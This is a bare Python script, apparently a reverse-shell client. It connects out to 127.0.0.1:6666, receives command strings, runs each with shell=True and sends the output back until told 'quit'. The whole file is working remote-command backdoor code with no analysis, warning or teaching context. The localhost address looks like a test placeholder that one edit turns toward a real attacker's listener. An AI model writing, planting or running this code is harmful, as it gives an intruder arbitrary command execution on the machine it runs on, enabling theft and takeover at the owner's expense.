import socket
import subprocess

ip = '127.0.0.1'
port = 6666

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip, port))

msg='TEST CLIENT'

cs.send(msg.encode())

msg=cs.recv(2048).decode()

while msg!='quit':
    p=subprocess.Popen(
        msg,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True
    )
    output,error=p.communicate()
    if len(output)>0:
        msg=str(output.decode())
    else:
        msg=str(error.decode())
    cs.send(msg.encode())

    msg=cs.recv(2048).decode()
